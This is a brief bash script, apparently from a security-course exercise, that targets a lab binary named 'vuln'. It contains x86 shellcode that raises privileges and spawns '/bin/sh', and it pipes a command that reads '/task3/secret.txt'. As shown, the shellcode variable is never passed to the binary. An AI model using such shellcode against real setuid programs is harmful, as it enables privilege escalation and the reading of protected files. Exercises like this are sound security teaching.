#!/usr/bin/env bash
SHELLCODE='\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80'
echo /bin/cat /task3/secret.txt | env -i \
  /task3/template/vuln "$(python -c "print('No, it doesn\\'t.')")" 0